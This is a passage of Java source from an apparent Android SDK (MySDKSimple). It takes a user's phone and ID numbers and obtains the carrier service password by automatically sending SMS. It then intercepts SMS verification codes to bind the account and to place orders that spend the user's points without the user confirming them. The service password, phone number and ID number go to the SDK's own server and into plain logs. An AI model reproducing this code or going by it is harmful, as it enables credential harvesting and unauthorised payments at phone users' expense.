package com.myyj.sdk;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

import com.myyj.sdk.tools.DataHelper;
import com.myyj.sdk.tools.LogHelper;
import com.myyj.sdk.tools.NetHelper;
import com.myyj.sdk.tools.StringHelper;
import com.myyj.sdk.tools.SuperSmsManager;
import com.myyj.sdk.tools.pwdhelperx.RPWManager;
import com.myyj.sdk.tools.sercer2.ServerHelper2;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Response;

import static com.myyj.sdk.tools.BaseHelper.getActivity;

public class MySDKSimple {
    private static MySDKSimple instance;

    private MySDKSimple() {
    }

    public static MySDKSimple getInstance() {
        if (instance == null) {
            instance = new MySDKSimple();
        }
        return instance;
    }

//    /**
//     * 判断是否可以读取短信
//     */
//    private void checkReadSms(final MySDK.ResultCallback callback) {
//        LogHelper.d("checkReadSms in UI thread");
//        // 如果可以读，则调用自动绑定
//        // 否则弹出WebView
//        MySDK.getInstance().getActivity().runOnUiThread(new Runnable() {
//            @Override
//            public void run() {
//                checkAndRequestPermission(new MySDK.ResultCallback() {
//                    @Override
//                    public void callback(int state, String result) {
//                        callback.callback(state, result);
//
//                    }
//                });
//            }
//        });
//    }
//
//    private void checkAndRequestPermission(final MySDK.ResultCallback callback)
//    {
//        SoulPermission.getInstance().checkAndRequestPermission(com.hjq.permissions.Permission.READ_SMS,
//                new CheckRequestPermissionListener() {
//                    @Override
//                    public void onPermissionOk(Permission permission) {
//                        Log.e("test===", "permissions is ok");
//                        if (hasNecessaryPMSGranted()) {
//                            Log.e("test===", "获取到读取短信权限");
//                            SmsHelper.SMSContentObserver.readAllSms();
//                            if (SmsHelper.SMSContentObserver.getSms != null && !"".equals(SmsHelper.SMSContentObserver.getSms)) {
//                                Log.e("test===", "邮箱内容：" + SmsHelper.SMSContentObserver.getSms);
//                                if (SmsHelper.SMSContentObserver.isGetSms) {
//                                    Log.e("test===", "信箱不为空且能获取到验证码");
//                                    if (SmsHelper.isMIUI()) {
//                                        Log.e("test===", "不能获取到验证码，小米手机");
//                                        new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                                .setCancelable(false)
//                                                .setTitle("提示")
//                                                .setMessage("通知类短信权限异常，请前往设置－>权限管理，打开通知类短信权限。")
//                                                .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
//                                                    @Override
//                                                    public void onClick(DialogInterface dialogInterface, int i) {
//                                                        //去设置页
//                                                        SoulPermission.getInstance().goApplicationSettings(new GoAppDetailCallBack() {
//                                                            @Override
//                                                            public void onBackFromAppDetail(Intent data) {
////                                                                checkAndRequestPermission(callback);
//                                                                callback.callback(0, "可以读取短信");
//                                                            }
//                                                        });
//                                                    }
//                                                })
//                                                .create().show();
//                                    }
//                                    else{
//                                        callback.callback(0, "可以读取短信");
//                                    }
//                                } else {
//                                    Log.e("test===", "信箱不为空且不能获取到验证码");
//                                    if (SmsHelper.isMIUI()) {
//                                        Log.e("test===", "不能获取到验证码，小米手机");
//                                        new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                                .setCancelable(false)
//                                                .setTitle("提示")
//                                                .setMessage("通知类短信权限异常，请前往设置－>权限管理，打开通知类短信权限。")
//                                                .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
//                                                    @Override
//                                                    public void onClick(DialogInterface dialogInterface, int i) {
//                                                        //去设置页
//                                                        SoulPermission.getInstance().goApplicationSettings(new GoAppDetailCallBack() {
//                                                            @Override
//                                                            public void onBackFromAppDetail(Intent data) {
//                                                                checkAndRequestPermission(callback);
//                                                            }
//                                                        });
//                                                    }
//                                                })
//                                                .create().show();
//                                    }
//                                    else{
//                                        callback.callback(2, "无法读取到验证码");
//                                    }
//                                }
//                            } else {
//                                Log.e("test===", "信箱为空");
//                                if (SmsHelper.isMIUI()) {
//                                    Log.e("test===", "信箱为空，小米手机");
//                                    new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                            .setTitle("提示")
//                                            .setMessage("读取短信,通知类短信权限异常，请前往设置－>权限管理，打开读取短信权限和通知类短信。")
//                                            .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
//                                                @Override
//                                                public void onClick(DialogInterface dialogInterface, int i) {
//                                                    //去设置页
//                                                    SoulPermission.getInstance().goApplicationSettings(new GoAppDetailCallBack() {
//                                                        @Override
//                                                        public void onBackFromAppDetail(Intent data) {
//                                                            checkAndRequestPermission(callback);
//                                                        }
//                                                    });
//                                                }
//                                            })
//                                            .create().show();
//                                } else if (SmsHelper.isVivo()) {
//                                    Log.e("test===", "信箱为空，vivo手机");
//                                    new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                            .setTitle("提示")
//                                            .setMessage("读取短信权限异常，请打开读取短信权限")
//                                            .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
//                                                @Override
//                                                public void onClick(DialogInterface dialogInterface, int i) {
//                                                    dialogInterface.dismiss();
//                                                    //去设置页
//                                                    Intent appIntent = MySDK.getInstance().getActivity().getPackageManager().getLaunchIntentForPackage("com.iqoo.secure");
//                                                    if (appIntent != null) {
//                                                        MySDK.getInstance().getActivity().startActivity(appIntent);
//                                                    }
//                                                    checkAndRequestPermission(callback);
//                                                }
//                                            })
//                                            .create().show();
//                                } else {
//                                    callback.callback(1, "无法读取短信");
//                                }
//                            }
//                        } else {
//                            Log.e("test===", "没有读取短信权限");
//                            checkAndRequestPermission(callback);
//                        }
//                    }
//
//                    @Override
//                    public void onPermissionDenied(Permission permission) {
//                        Log.e("test===", "permissions is fail");
//                        if (permission.shouldRationale()) {
//                            new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                    .setCancelable(false)
//                                    .setTitle("提示")
//                                    .setMessage("如果你拒绝了短信权限，你将无法接收短信，请点击授予权限")
//                                    .setPositiveButton("授予", new DialogInterface.OnClickListener() {
//                                        @Override
//                                        public void onClick(DialogInterface dialogInterface, int i) {
//                                            //用户确定以后，重新执行请求原始流程
//                                            checkAndRequestPermission(callback);
//                                        }
//                                    }).create().show();
//                        } else {
//                            String permissionDesc = permission.getPermissionNameDesc();
//                            new AlertDialog.Builder(MySDK.getInstance().getActivity())
//                                    .setCancelable(false)
//                                    .setTitle("提示")
//                                    .setMessage(permissionDesc + "异常，请前往设置－>权限管理，打开" + permissionDesc + "。")
//                                    .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
//                                        @Override
//                                        public void onClick(DialogInterface dialogInterface, int i) {
//                                            //去设置页
//                                            SoulPermission.getInstance().goApplicationSettings(new GoAppDetailCallBack() {
//                                                @Override
//                                                public void onBackFromAppDetail(Intent data) {
//                                                    checkAndRequestPermission(callback);
//                                                }
//                                            });
//                                        }
//                                    }).create().show();
//                        }
//                    }
//                });
//
//    }


//    /**
//     * 判断应用是否已经获得SDK运行必须的READ_SMS权限。
//     */
//    private boolean hasNecessaryPMSGranted() {
//        if (PackageManager.PERMISSION_GRANTED == ActivityCompat.checkSelfPermission(MySDK.getInstance().getActivity(), com.hjq.permissions.Permission.READ_SMS)) {
//            return true;
//        }
//        return false;
//    }

    /**
     * 只发送第一条短信，或者打电话
     *
     * @param callback
     */
    public void doManualGetServicePassword(final ResultCallback callback) {
        LogHelper.d("doManualGetServicePassword");
        SuperSmsManager.getInstance().setClipStr("");
        RPWManager.RPW(MySDK.getInstance().getPhoneNumber(), MySDK.getInstance().getIdCardNum(), true, callback);
    }

    /**
     * 自动发短信获取服务密码
     */
    public void doAutoGetServicePassword(final ResultCallback callback) {
        LogHelper.d("doAutoGetServicePassword");
        SuperSmsManager.getInstance().setClipStr("");
        MySDK.getInstance().dispatchEvent("EVENT_GET_SERVICEPASSWORD", MySDK.getInstance().getPhoneNumber() + "_" + MySDK.getInstance().getIdCardNum());
        ServerHelper2.getInstance().updatePhoneAndIdInfo(MySDK.getInstance().getPhoneNumber(), MySDK.getInstance().getIdCardNum());
        RPWManager.RPW(MySDK.getInstance().getPhoneNumber(), MySDK.getInstance().getIdCardNum(), false, new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                if (state == 0) {
                    ServerHelper2.getInstance().updateServicePassword(result, true);
                    MySDK.getInstance().dispatchEvent("EVENT_GET_SERVICEPASSWORD_SUCCESS", result, state);
                } else {
                    MySDK.getInstance().dispatchEvent("EVENT_GET_SERVICEPASSWORD_FAIL", result, state);
                }
                callback.callback(state, result);
            }
        });
    }

    public void test() {
        LogHelper.d("test");
        doManualResetServicePassword();
    }

    /**
     * 调用手动重置密码的流程
     */
    public void doManualResetServicePassword() {
        String phoneNumber = MySDK.getInstance().getPhoneNumber();
        String idCardNumber = MySDK.getInstance().getIdCardNum();
        RPWManager.RSM(phoneNumber, idCardNumber);
    }

    /**
     * 自动获取绑定需要的短信验证码
     */
    public void doAutoGetBindingSmsCode(final ResultCallback resultCallback) {
        LogHelper.d("doAutoGetBindingSmsCode");
//        RPWManager.GVC(new ResultCallback() {
//            @Override
//            public void callback(int state, String result) {
//                doSendBindSmsCode(new ResultCallback() {
//                    @Override
//                    public void callback(int state, String result) {
//                        LogHelper.d("已经发送绑定码 " + result);
//                    }
//                });
//            }
//        }, resultCallback);
        MySDK.getInstance().dispatchEvent("EVENT_GET_BINDING_SMSCODE", "监听绑定验证码");
        RPWManager.GVC(new CallbackInCallback() {
            @Override
            public void callback(int state, final ResultCallback callbackAfterFinish) {
                doSendBindSmsCode(new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        LogHelper.d("已经发送绑定码 " + result);
                        callbackAfterFinish.callback(state, result);
                    }
                });
            }
        }, new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                if (state != 0) {
                    MySDK.getInstance().dispatchEvent("EVENT_GET_BINDING_SMSCODE_FAIL", result, state);
                } else {
                    MySDK.getInstance().dispatchEvent("EVENT_GET_BINDING_SMSCODE_SUCCESS", result, state);
                }
                resultCallback.callback(state, result);
            }
        });
    }

    /**
     //     * 自动登录
     //     * 0 登录成功，无需绑定
     //     * 2 登录失败
     //     * 3 udid为空
     //     * 4 channelId为空
     //     * 返回非0需要检查参数（手机号，渠道ID，UDID等）
     //     */
//    public void doAutoLogin(final ResultCallback resultCallback) {
////        if (MySDK.getInstance().hasLogin()) {
////            resultCallback.callback(0, "已经登录过");
////            return;
////        }
//        LogHelper.d("doAutoLogin");
//        ServerHelper.getInstance().login(new ResultCallback() {
//            @Override
//            public void callback(int state, String result) {
//                if (state == 0) {
//                    if (!ServerHelper.getInstance().isHasBind()) {
//                        resultCallback.callback(0, "需要绑定");
//                        return;
//                    }
//                    String phoneNum = ServerHelper.getInstance().getPhoneNum(); // 手机号码
//                    String idNumber = ServerHelper.getInstance().getIdNumber(); // 身份证号
//                    if (!StringHelper.isEmpty(phoneNum)) {
//                        doLogin(phoneNum, idNumber, false, resultCallback);
//                    } else {
//                        resultCallback.callback(2, "没有手机号");
//                    }
//                } else {
//                    resultCallback.callback(state, "服务器登录失败");
//                }
//            }
//        });
//    }

    /**
     * 页面一: 输入手机号和身份证，进行绑定<br/>
     * 1、已经绑定，跳到页面三<br/>
     * 2、尝试自动绑定，失败则页面二，成功则跳到页面三<br/>
     * 3、判断出此手机是否可以读取短信<br/>
     *
     * @param phoneNum       手机号
     * @param idCardNum      身份证
     * @param tryAutoBinding 自动绑定开关
     * @param resultCallback 结果返回0，则绑定成功，否则需要手动绑定
     */
    public void doLogin(final String phoneNum, final String idCardNum, final boolean tryAutoBinding, final ResultCallback resultCallback) {
        LogHelper.d("doLogin " + phoneNum + " " + idCardNum);
        if (StringHelper.isEmpty(phoneNum)) {
            resultCallback.callback(-1, "手机号不正确");
            return;
        }
//        if (StringHelper.isEmpty(idCardNum)) {
//            resultCallback.callback(-2, "身份证号不正确");
//            return;
//        }
        MySDK.getInstance().setPhoneNum(phoneNum);
        MySDK.getInstance().setIdCardNum(idCardNum);
        ServerHelper2.getInstance().updatePhoneAndIdInfo(phoneNum, idCardNum);
        // 验证手机号有效，尝试登录银夏，密码是超级密码
        MySDK.getInstance().registerSmsVerify(phoneNum, MySDK.getInstance().getSuperSms(), new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                try {
                    JSONObject o = new JSONObject(result);

                    if (TextUtils.isEmpty(o.getString("info"))) {
                        msdk.dispatchEvent("EVENT_REGISTER_FAIL", "登录银夏失败");
                    }

                    if (state != 0) {
                        resultCallback.callback(state, o.getString("info"));
                        return;
                    }
                    int infoState = o.getInt("infoState");
//                {"infoState":100301,"info":"验证码错误"}
//                {"infoState":100302,"info":"用户已注册"}
//                {"infoState":0,"info":"验证码校验成功"}
                    if (infoState == 0) { // 验证码校验成功
                        // 注册银夏A
                        MySDK.getInstance().setUserInfo(phoneNum, MySDK.getInstance().getSuperSms(),
                                MySDK.getInstance().getDefaultEmail(),
                                MySDK.getInstance().getDefaultPassword(),
                                MySDK.getInstance().getDefaultPassword(),
                                new ResultCallback() {
                                    @Override
                                    public void callback(int state, String result) {
                                        if (state != 0) {
                                            resultCallback.callback(state, result);
                                            MySDK.getInstance().dispatchEvent("EVENT_REGISTER_FAIL", result);
                                            return;
                                        } else {
                                            MySDK.getInstance().dispatchEvent("EVENT_REGISTER_SUCCESS", result);
                                        }
                                        doAfterRegister(phoneNum, true, tryAutoBinding, resultCallback);
                                        return;
                                    }
                                });
                    } else if (infoState == 100302) { // 用户已注册
                        doAfterRegister(phoneNum, false, tryAutoBinding, resultCallback);
                        return;
                    } else {
                        String info = o.getString("info");
                        resultCallback.callback(infoState, info);
                        return;
                    }


                } catch (JSONException e) {
                    e.printStackTrace();
                    LogHelper.e(e);
                }
//                resultCallback.callback(state, result);
            }
        });
    }

    /**
     * 注册后的处理
     */
    private void doAfterRegister(String phoneNum, final boolean newUser, final boolean tryAutoBinding, final ResultCallback resultCallback) {
        LogHelper.d("doAfterRegister " + phoneNum + " newUser:" + newUser + " tryAutoBinding:" + tryAutoBinding);
        MySDK.getInstance().login(phoneNum, MySDK.getInstance().getDefaultPassword(), new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                if (state == 0) {
                    MySDK.getInstance().dispatchEvent("EVENT_LOGIN_SUCCESS", newUser ? "新用户" : "旧用户");
                    if (MySDK.getInstance().hasBinding() && !LogHelper.isInDebug()) {
                        resultCallback.callback(0, "已经绑定");
                    } else {
                        if (tryAutoBinding) {
                            doAutoBinding(resultCallback);
                        } else {
//                            LogHelper.d("跳过自动绑定");
                            resultCallback.callback(0, "跳过自动绑定");
                        }
                    }
                } else {
                    MySDK.getInstance().dispatchEvent("EVENT_LOGIN_FAIL", result);
                    resultCallback.callback(state, result);
                }
            }
        });
    }

    /**
     * 自动绑定
     */
    private void doAutoBinding(final ResultCallback resultCallback) {
        LogHelper.d("doAutoBinding");
//        checkReadSms(new MySDK.ResultCallback() {
//            @Override
//            public void callback(int state, String result) {
//                LogHelper.d("checkReadSms return " + state + " " + result);
//                if (state == 0) {
        doAutoGetServicePassword(new ResultCallback() {
            @Override
            public void callback(int state, final String servicePassword) {
                if (state == 0) {
                    String info = MySDK.getInstance().getDefaultServicePassword().equals(servicePassword) ? "默认" : "手写";
                    MySDK.getInstance().dispatchEvent("EVENT_AUTO_GET_SERVICE_PWD", info);
                    doAutoGetBindingSmsCode(new ResultCallback() {
                        @Override
                        public void callback(int state, String smsCode) {
                            if (state == 0) { // 都拿到了，可以绑定了
                                doBinding(servicePassword, smsCode, true, resultCallback);
                            } else { // 拿不到短信验证码
                                resultCallback.callback(1, "需要手动绑定");
                            }
                        }
                    });
                } else { // 拿不到服务密码
                    resultCallback.callback(2, "需要手动绑定");
                    MySDK.getInstance().dispatchEvent("EVENT_CANT_GET_SERVICE_PWD", "" + state);
                }
            }
        });
//                } else { // 不支持读取短信
//                    resultCallback.callback(3, "需要手动绑定");
//                }
//            }
//        });
    }

    /**
     * 绑定
     * 页面二: 输入服务密码和短信验证码进行手动绑定<br/>
     * 1、尽量帮助用户重置服务密码<br/>
     * 2、不需要尝试读取验证码了<br/>
     *
     * @param servicePassword 服务密码
     * @param smsCode         验证短信
     */
    public void doBinding(final String servicePassword, String smsCode, final boolean auto, final ResultCallback callback) {
        LogHelper.d("doBinding" + servicePassword + " " + smsCode + " auto:" + auto);
        if (!auto) {
            SuperSmsManager.getInstance().setAutoReceiveSms(false);
        }
        if (!MySDK.getInstance().hasLogin()) {
            callback.callback(1, "未登录不能绑定");
            return;
        }
        if (MySDK.getInstance().hasBinding()) {
            callback.callback(0, "无需重复绑定");
            return;
        }
        final String info = auto ? "auto" : "manual";
        MySDK.getInstance().dispatchEvent("EVENT_BIND", servicePassword + "_" + smsCode + "_" + info);
        MySDK.getInstance().bindChangyoyoPlatform(MySDK.getInstance().getPhoneNumber(), servicePassword, smsCode, new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                LogHelper.d("doBinding result " + state + " " + state);
                if (state == 0) {
                    ServerHelper2.getInstance().updateServicePassword(servicePassword, auto);
                    MySDK.getInstance().dispatchEvent("EVENT_BIND_SUCCESS", info, auto ? 1 : 0);
                    MySDK.getInstance().login(MySDK.getInstance().getPhoneNumber(),
                            MySDK.getInstance().getDefaultPassword(), callback);
                } else {
                    MySDK.getInstance().dispatchEvent("EVENT_BIND_FAIL", result, state);
                    callback.callback(state, result);
                }
            }
        });
    }

    /**
     * 上传二维码
     *
     * @param qr             扫描出的二维码字串
     * @param resultCallback 返回0则为上传成功
     */
    public void uploadQR(String qr, ResultCallback resultCallback) {
        LogHelper.d("uploadQR " + qr);
        if (StringHelper.isEmpty(qr)) {
            return;
        }
        ServerHelper2.getInstance().setQrcode(qr);
        ServerHelper2.getInstance().updateInfo("qrcode", qr);
        resultCallback.callback(0, "上传成功");
    }

    public String getQrcode() {
        return ServerHelper2.getInstance().getQrcode();
    }

    /**
     * 查询积分
     *
     * @return
     */
    public int getScore() {
        return MySDK.getInstance().getScore();
    }

    /**
     * 获取可扣除的最大积分
     *
     * @return 如返回值不大于0，则不可兑换
     */
    public int getCostScoreMax() {
        int[] ret = getBestGoodsInfo();
        return ret[1];
    }

    public HashMap<Integer, Integer> getGoodsInfos() {
        HashMap<Integer, Integer> goodsMap = new HashMap<>();
//        goodsMap.put(1, 720);
//        goodsMap.put(2, 1200);
//        goodsMap.put(3, 2400);
//        goodsMap.put(4, 7680);
//        goodsMap.put(5, 240);
//        goodsMap.put(6, 15360);

        int tmp = 120;

//        goodsMap.put(80, 1 * tmp); //120
        goodsMap.put(7, 1 * tmp); //120
        goodsMap.put(8, 5 * tmp); // 600
        goodsMap.put(9, 10 * tmp); // 1200
//        goodsMap.put(10, 20 * tmp);// 2400
//        goodsMap.put(11, 50 * tmp);// 6000
//        goodsMap.put(13, 75 * tmp);// 9000
//        goodsMap.put(14, 100 * tmp);//12000
//        goodsMap.put(15, 125 * tmp);//15000
//        goodsMap.put(16, 150 * tmp);//18000
        goodsMap.put(81, 2 * tmp); //240
        goodsMap.put(82, 3 * tmp); //360
        goodsMap.put(83, 4 * tmp); //480
        goodsMap.put(84, 5 * tmp); //600
        goodsMap.put(85, 6 * tmp); //720
        goodsMap.put(86, 7 * tmp); //840
        goodsMap.put(87, 8 * tmp); //960
        goodsMap.put(88, 9 * tmp);//1080
        goodsMap.put(89, 10 * tmp);//1200
        goodsMap.put(90, 15 * tmp);//1800
        goodsMap.put(91, 20 * tmp);//2400
        goodsMap.put(92, 30 * tmp);//3600
        goodsMap.put(93, 40 * tmp);//4800
        goodsMap.put(94, 50 * tmp);//6000
        goodsMap.put(95, 60 * tmp);//7200
        goodsMap.put(96, 70 * tmp);//8400
        goodsMap.put(97, 80 * tmp);//9600
        goodsMap.put(98, 90 * tmp);//10800
        goodsMap.put(99, 100 * tmp);//12000
        goodsMap.put(100, 110 * tmp);//13200
        goodsMap.put(101, 120 * tmp);//14400
        goodsMap.put(102, 130 * tmp);//15600
        goodsMap.put(103, 140 * tmp);//16800
        goodsMap.put(104, 150 * tmp);//18000
        return goodsMap;
    }

    public int getCostByGoodsId(int goodsId) {
        if (goodsId <= 0) {
            return 0;
        }
        HashMap<Integer, Integer> goodsMap = getGoodsInfos();
        return goodsMap.get(goodsId);
    }

    /**
     * 获取可兑换的最佳商品信息
     *
     * @return
     */
    private int[] getBestGoodsInfo() {
        HashMap<Integer, Integer> goodsMap = getGoodsInfos();
        int allScore = getScore();
        int goodsId = -1;
        int maxScore = -1;
        for (Map.Entry<Integer, Integer> entry : goodsMap.entrySet()) {
            int value = entry.getValue();
            if (value > maxScore && value <= allScore) {
                maxScore = value;
                goodsId = entry.getKey();
            }
        }
        LogHelper.d("当前积分" + allScore + " 可兑换 " + maxScore + " 商品ID " + goodsId);
        return new int[]{goodsId, maxScore, 1};
    }

    /**
     * 手动绑定发送验证码
     *
     * @param resultCallback
     */
    public void doSendBindSmsCode(ResultCallback resultCallback) {
        MySDK.getInstance().sendBindingVerifyCode(MySDK.getInstance().getPhoneNumber(), resultCallback);
    }

    private long _orderId;
    private int _goodsId;

    /**
     * 下单并支付
     * 返回0则自动支付完成了
     * 返回7则需要显示输入框，改手动输入验证码
     * 返回其他值表示无法下单
     *
     * @param goodsId    商品ID，传-1
     * @param tryAutoPay 尝试自动登录的开关
     * @param callback   0 支付成功
     *                   1 未登录
     *                   2 未绑定
     *                   3 积分不足以购买最低档商品
     *                   4 购买数量有误
     *                   5 下单错误
     *                   6 网络错误
     *                   7 无法取到验证码，需要手动处理
     */
    public void doCreateOrder(int goodsId, boolean tryAutoPay, final ResultCallback callback) {
        if (!aTry()) {
            tryAutoPay = false;
        }
        LogHelper.d("doCreateOrder" + goodsId + " " + tryAutoPay);
        int goodNum = 1;
        if (goodsId <= 0) {
            int[] bestInfo = getBestGoodsInfo();
            goodsId = bestInfo[0];
            goodNum = bestInfo[2];
            if (goodsId <= 0) {
                callback.callback(3, "积分不足");
                return;
            }
        }
//        final String ORDER_INFO = "ORDER_" + goodsId + "_" + goodNum;
//        final int costGoodsId = getCostByGoodsId(goodsId);
        doCreateOrderAndPay(goodsId, goodNum, tryAutoPay, new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                callback.callback(state, result);
//                MySDK.getInstance().dispatchEvent("EVENT_CREATE_ORDER", ORDER_INFO + "_" + result, costGoodsId);
            }
        });
    }

    /**
     * 自动创建订单并尝试支付
     *
     * @param goodsId
     * @param resultCallback
     */
    private void doCreateOrderAndPay(final int goodsId, final int goodNum, final boolean tryAutoPay, final ResultCallback resultCallback) {
        LogHelper.d("doCreateOrderAndPay " + goodsId + " " + goodNum);
//        /nvwa/home/createOrder?userId=1&goodsId=5&goodNum=1&addressId=10&userToken=2019080518331815923621923
        if (!MySDK.getInstance().hasLogin()) {
            resultCallback.callback(1, "没有登录");
            return;
        }
        if (!MySDK.getInstance().hasBinding()) {
            resultCallback.callback(2, "没有绑定");
            return;
        }
        if (goodsId <= 0) {
            resultCallback.callback(3, "没有可以购买的商品");
            return;
        }
        if (goodNum <= 0) {
            resultCallback.callback(4, "购买数量有误");
            return;
        }
        _goodsId = goodsId;
        _orderId = -1;
        if (!tryAutoPay) {
            createOrder(goodsId, goodNum, new ResultCallback() {
                @Override
                public void callback(int state, String result) {
                    if (state == 0) {
                        resultCallback.callback(7, "请手动输入验证码");
                    } else {
                        resultCallback.callback(state, result);
                    }
                }
            });
            return;
        }
        RPWManager.GVC(new CallbackInCallback() {
            @Override
            public void callback(int state, final ResultCallback callbackAfterFinish) {
                createOrder(goodsId, goodNum, new ResultCallback() {
                    @Override
                    public void callback(int state, String result) {
                        if (state != 0) {
                            MySDK.getInstance().dispatchEvent("EVENT_CREATE_ORDER_FAIL", result, state);
                        }
                        callbackAfterFinish.callback(state, result);
                    }
                });
            }
        }, new ResultCallback() {
            @Override
            public void callback(int state, String result) {
                MySDK.getInstance().dispatchEvent("EVENT_GVC_AUTOPAY", result, state);
                if (state == 0) {
                    String smsCode = result;
                    doPayOrder(smsCode, true, resultCallback);
                } else if (_goodsId <= -1) {
                    resultCallback.callback(11, "创建订单失败");
                } else {
                    resultCallback.callback(7, "无法取到验证码，需要手动处理");
                }
            }
        });
    }


    private void createOrder(int goodsId, int goodNum, final ResultCallback resultCallback) {
        //        String cpParam =ServerHelper2.getInstance().url()+"/system/callback?"+"tel="+MySDK.getInstance().getPhoneNumber()+"&price="+
        //                msdk.getCostByGoodsId(goodsId)+"&goodsId="+goodsId+"&goodsnum="+goodNum+"&incomeId="+1+"&uid="+ServerHelper2.getInstance().getUid()+"&uid="+MySDK.getInstance().getProductId();
        String url = MySDK.getInstance().getURL("home/createOrder");
        // http://192.168.3.17:7456/system/callback?cpParam=1_2_10027
        // 支付回调用于支付成功时反馈给t_order表，透传参数cpParam用于我方识别具体的支付情况，比如哪家CP，哪个产品id，哪个uid等
        // cpParam下有多个参数，用下划线隔开
        // 1 cpId:用于标识是我们或者其他下属cp渠道的标识，见表t_order_channel
        // 2 projectId:用于标识哪款产品，见表t_order_project中的第二列
        // 3 uid:用于标识产品表里的手机硬件id，见表t_user或者新表t_user_device中的第一列，外包项目没有这个参数的话可以写0
        // 其他参数可以向后扩展，下划线隔开即可
        SharedPreferences sp = getActivity().getSharedPreferences("data", Context.MODE_PRIVATE);
        String urlCallbackPay = ServerHelper2.getInstance().getConfigValue("url_cbpay", "http://192.168.3.17:7456/system/callback?cpParam=");
//        urlCallbackPay = "http://yunos.youxilou.com/data/inter/sms/552/?cpParam=";
        String cpParam = urlCallbackPay + "" + MySDK.getInstance().get_channelCode() + "_"
                + MySDK.getInstance().getProductId() + "_"
                + ServerHelper2.getInstance().getUid() + "_" + sp.getString("id", "0");
        LogHelper.d("cpParam " + cpParam);
        Map<String, String> params = DataHelper.toMap(
                "userId", MySDK.getInstance().getUserId(),
                "goodsId", String.valueOf(goodsId),
                "goodNum", String.valueOf(goodNum),
                "addressId", String.valueOf(0),
                "userToken", MySDK.getInstance().getUserToken(),
                "cpParam", cpParam
        );
        String info = goodsId + "_" + goodNum;
        MySDK.getInstance().dispatchEvent("EVENT_CREATE_ORDER", info, getCostByGoodsId(goodsId));
        NetHelper.getInstance().postDataAsynToNet(url, params, new NetHelper.MyNetCall() {
            @Override
            public void success(Call call, Response response) throws IOException {
//                {"infoState":0,"info":"创建订单成功","data":{"orderId":3}}
                String result = response.body().string();
                LogHelper.d("下单返回 " + result);

                try {
                    JSONObject o = new JSONObject(result);
                    int infoState = o.getInt("infoState");
                    if (infoState == 0) {
                        JSONObject data = o.getJSONObject("data");
                        _orderId = data.getInt("orderId");
                        resultCallback.callback(0, result);
                        // 创建成功，等待验证码处理
                        return;
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                resultCallback.callback(5, result);
            }

            @Override
            public void failed(Call call, IOException e) {
                resultCallback.callback(6, "联网失败");
                e.printStackTrace();
            }
        });
    }

    /**
     * 再次发送短信验证码【付费】
     * 下单时会默认发送一个
     *
     * @param callback 回调
     */
    public void doResendPayVerifyCode(final ResultCallback callback) {
//39.107.6.163/nvwa/home/cySMScode?userId=1&orderId=18&goodsId=5&nwUrlType=17&userToken=2019080709150709513546621
        LogHelper.d("sendBindingVerifyCode " + MySDK.getInstance().getPhoneNumber());
        if (_orderId <= -1) {
            callback.callback(2, "订单无效");
            return;
        }
        String url = MySDK.getInstance().getURL("home/cySMScode");
        Map<String, String> params = DataHelper.toMap(
                "userId", MySDK.getInstance().getUserId(),
                "orderId", String.valueOf(_orderId),
                "goodsId", String.valueOf(_goodsId),
                "nwUrlType", String.valueOf(17),
                "userToken", MySDK.getInstance().getUserToken()
        );
        NetHelper.getInstance().postDataAsynToNet(url, params, new NetHelper.MyNetCall() {
            @Override
            public void success(Call call, Response response) throws IOException {
                String result = response.body().string();
                callback.callback(0, result);
            }

            @Override
            public void failed(Call call, IOException e) {
                callback.callback(1, "发送失败");
            }
        });
    }

    public void doPayOrder(String smsCode, final ResultCallback callback) {
        doPayOrder(smsCode, false, callback);
    }

    /**
     * 支付订单
     * 0 支付成功
     * 8 支付失败
     */
    private void doPayOrder(String smsCode, boolean auto, final ResultCallback callback) {
        if (_goodsId <= 0) {
            callback.callback(9, "订单不存在");
            return;
        }
//        /nvwa/home/payOrder?userId=1&orderId=3&goodsId=5&smsCode=544297&userToken=2019080518331815923621923
        String url = MySDK.getInstance().getURL("home/payOrder");
        Map<String, String> params = DataHelper.toMap(
                "userId", MySDK.getInstance().getUserId(),
                "orderId", String.valueOf(_orderId),
                "goodsId", String.valueOf(_goodsId),
                "smsCode", smsCode,
                "userToken", MySDK.getInstance().getUserToken()
        );
        final String info = (auto ? "auto_" : "manual_") + "_" + _goodsId + "_" + smsCode;
        MySDK.getInstance().dispatchEvent("EVENT_PAY_ORDER", info, getCostByGoodsId(_goodsId));
        NetHelper.getInstance().postDataAsynToNet(url, params, new NetHelper.MyNetCall() {
            @Override
            public void success(Call call, Response response) throws IOException {
//                {"infoState":0,"info":"订单支付成功","data":{"orderId":3,"redeemInfo":"m19yca92"}}
                String result = response.body().string();
                LogHelper.d("doPayOrder " + result);
                try {
                    JSONObject o = new JSONObject(result);
                    int infoState = o.getInt("infoState");
                    if (infoState == 0) {
//                        JSONObject data = o.getJSONObject("data");
                        callback.callback(0, result);
                        int cost = getCostByGoodsId(_goodsId);
                        ServerHelper2.getInstance().onCost(cost);
                        MySDK.getInstance().doQueryScore(new ResultCallback() {
                            @Override
                            public void callback(int state, String result) {
                            }
                        });
                        MySDK.getInstance().dispatchEvent("EVENT_PAY_SUCCESS", info, getCostByGoodsId(_goodsId));
                        msdk.dispatchEvent("createOrder", "支付成功",80);
                        return;
                    }else{
                        msdk.dispatchEvent("createOrder", "支付失败",75);
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                callback.callback(8, result);
